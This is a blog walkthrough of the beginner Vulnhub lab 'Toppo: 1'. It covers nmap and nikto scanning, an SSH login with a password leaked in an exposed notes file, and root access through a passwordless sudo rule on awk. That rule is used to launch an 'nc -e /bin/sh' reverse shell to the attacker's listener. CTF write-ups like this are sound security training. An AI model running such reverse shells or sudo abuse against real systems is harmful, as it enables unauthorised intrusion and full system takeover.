---
layout:     post
title:      "Vulnhub.com - Toppo: 1"
date:       2018-07-16 0:00:00
author:     "W3ndige"
permalink: /:title/
category: Vulnhub
---

Today we're going to work through easy machine from Vulnhub called ***Toppo***. If you don't have time, but still want to get these shells, just try this machine. 

{% highlight text %}
The Machine isn't hard to own and don't require advanced exploitation .

Level : Beginner

DHCP : activated

Inside the zip you will find a vmdk file , and I think you will be able to use it with any usual virtualization software ( tested with Virtualbox) .

If you have any question : my twitter is @h4d3sw0rm

Happy Hacking !
{% endhighlight %}

* Author: [Hadi Mene](https://twitter.com/@h4d3sw0rm)
* Download: [https://www.vulnhub.com/entry/toppo_1,245/](https://www.vulnhub.com/entry/toppo_1,245/)

Big thanks to the author for creating this challenge and for Vulnhub for hosting and curating this great set of machines!

### Solution

Firstly let's start with our usual `nmap` scan in order to view the open ports on this machine. 

What parameters I'm using?

* *-v* - verbose output
* *-sS* - TCP-SYN scan
* *-A* - OS detection, version detection and traceroute
* *-T4* - aggresive scan
* *-p-* - scan all 65535 ports

{% highlight bash %}
root@kali:~# nmap -v -sS -A -T4 -p- 10.0.0.6
Starting Nmap 7.70 ( https://nmap.org ) at 2018-07-12 12:38 EDT
NSE: Loaded 148 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 12:38
Completed NSE at 12:38, 0.00s elapsed
Initiating NSE at 12:38
Completed NSE at 12:38, 0.00s elapsed
Initiating ARP Ping Scan at 12:38
Scanning 10.0.0.6 [1 port]
Completed ARP Ping Scan at 12:38, 0.04s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 12:38
Completed Parallel DNS resolution of 1 host. at 12:38, 0.00s elapsed
Initiating SYN Stealth Scan at 12:38
Scanning 10.0.0.6 [65535 ports]
Discovered open port 80/tcp on 10.0.0.6
Discovered open port 22/tcp on 10.0.0.6
Discovered open port 111/tcp on 10.0.0.6
Discovered open port 50394/tcp on 10.0.0.6
Completed SYN Stealth Scan at 12:38, 4.12s elapsed (65535 total ports)
Initiating Service scan at 12:38
Scanning 4 services on 10.0.0.6
Completed Service scan at 12:38, 11.02s elapsed (4 services on 1 host)
Initiating OS detection (try #1) against 10.0.0.6
NSE: Script scanning 10.0.0.6.
Initiating NSE at 12:38
Completed NSE at 12:38, 0.38s elapsed
Initiating NSE at 12:38
Completed NSE at 12:38, 0.01s elapsed
Nmap scan report for 10.0.0.6
Host is up (0.00046s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| ssh-hostkey: 
|   1024 ec:61:97:9f:4d:cb:75:99:59:d4:c1:c4:d4:3e:d9:dc (DSA)
|   2048 89:99:c4:54:9a:18:66:f7:cd:8e:ab:b6:aa:31:2e:c6 (RSA)
|   256 60:be:dd:8f:1a:d7:a3:f3:fe:21:cc:2f:11:30:7b:0d (ECDSA)
|_  256 39:d9:79:26:60:3d:6c:a2:1e:8b:19:71:c0:e2:5e:5f (ED25519)
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Clean Blog - Start Bootstrap Theme
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100024  1          49973/udp  status
|_  100024  1          50394/tcp  status
50394/tcp open  status  1 (RPC #100024)
MAC Address: 08:00:27:C5:CA:47 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Uptime guess: 0.010 days (since Thu Jul 12 12:23:50 2018)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.46 ms 10.0.0.6

NSE: Script Post-scanning.
Initiating NSE at 12:38
Completed NSE at 12:38, 0.00s elapsed
Initiating NSE at 12:38
Completed NSE at 12:38, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.17 seconds
           Raw packets sent: 65558 (2.885MB) | Rcvd: 65550 (2.623MB)
{% endhighlight %}

From here I can see only one service that's worth looking at the start, which is `http` running on port `80`. While looking manually at the website, I decided to run `nikto` to scan the website.  

{% highlight bash %}
root@kali:~# nikto -h 10.0.0.6
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.0.0.6
+ Target Hostname:    10.0.0.6
+ Target Port:        80
+ Start Time:         2018-07-12 12:20:26 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.10 (Debian)
+ Server leaks inodes via ETags, header found with file /, fields: 0x1925 0x563f5cf714e80 
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.10 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+ OSVDB-3268: /admin/: Directory indexing found.
+ OSVDB-3092: /admin/: This might be interesting...
+ OSVDB-3268: /img/: Directory indexing found.
+ OSVDB-3092: /img/: This might be interesting...
+ OSVDB-3268: /mail/: Directory indexing found.
+ OSVDB-3092: /mail/: This might be interesting...
+ OSVDB-3092: /manual/: Web server manual found.
+ OSVDB-3268: /manual/images/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7517 requests: 0 error(s) and 15 item(s) reported on remote host
+ End Time:           2018-07-12 12:20:53 (GMT-4) (27 seconds)
---------------------------------------------------------------------------
{% endhighlight %}

Here we have, an `/admin/` directory. Inside there was a note in `notes.txt` file. 

{% highlight text %}
URL OF NOTE: http://10.0.0.6/admin/notes.txt

Note to myself :

I need to change my password :/ 12345ted123 is too outdated but the technology isn't my thing i prefer go fishing or watching soccer .
{% endhighlight %}

At first I thought about enumerating more in order to find the username, as we already have the password. But stupid me overthought this part way too much.

I didn't notice that the username is already ***in the password***. Like what was I thinking, `ted` can be the username, and it probably will as this is easy machine.  

{% highlight bash %}
root@kali:~# ssh ted@10.0.0.6
ted@10.0.0.6's password: 

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Apr 15 12:33:00 2018 from 192.168.0.29

ted@Toppo:~$ ls -la
total 24
drwxr-xr-x 2 ted  ted  4096 Jul 16 12:55 .
drwxr-xr-x 3 root root 4096 Apr 15 10:08 ..
-rw------- 1 ted  ted     1 Apr 15 12:33 .bash_history
-rw-r--r-- 1 ted  ted   220 Apr 15 10:08 .bash_logout
-rw-r--r-- 1 ted  ted  3515 Apr 15 10:08 .bashrc
-rw-r--r-- 1 ted  ted   675 Apr 15 10:08 .profile
{% endhighlight %}

Of course that the password works. Now we have to escalate our privilages. Here comes good old [G0tm1k post](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/) and while trying different steps I've noticed this entry in `/etc/sudoers` file. 

{% highlight bash %}
ted@Toppo:~$ cat /etc/sudoers
ted ALL=(ALL) NOPASSWD: /usr/bin/awk
{% endhighlight %}

Now I decided to check whether `nc` is installed on the system. 

{% highlight bash %}
ted@Toppo:~$ which nc
/bin/nc
{% endhighlight %}

And now we can use simple `system()` function from `awk` in order to run the reverse shell with `nc`. 

{% highlight bash %}
ted@Toppo:~$ awk 'BEGIN {system("nc -e /bin/sh 10.0.0.4 1337")}'
{% endhighlight %}

Now we can look at the ouputu of the previously started listener.  

{% highlight bash %}
root@kali:~# nc -lvp 1337
listening on [any] 1337 ...
10.0.0.6: inverse host lookup failed: Unknown host
connect to [10.0.0.4] from (UNKNOWN) [10.0.0.6] 52985
whoami
root
cd /root
ls -la
total 24
drwx------  2 root root 4096 Apr 15 11:40 .
drwxr-xr-x 21 root root 4096 Apr 15 10:02 ..
-rw-------  1 root root   53 Apr 15 12:28 .bash_history
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
-rw-r--r--  1 root root  397 Apr 15 10:19 flag.txt
-rw-r--r--  1 root root  140 Nov 19  2007 .profile
cat flag.txt
_________                                  
|  _   _  |                                 
|_/ | | \_|.--.   _ .--.   _ .--.    .--.   
    | |  / .'`\ \[ '/'`\ \[ '/'`\ \/ .'`\ \ 
   _| |_ | \__. | | \__/ | | \__/ || \__. | 
  |_____| '.__.'  | ;.__/  | ;.__/  '.__.'  
                 [__|     [__|              

Congratulations ! there is your flag : 0wnedlab{p4ssi0n_c0me_with_pract1ce}
{% endhighlight %}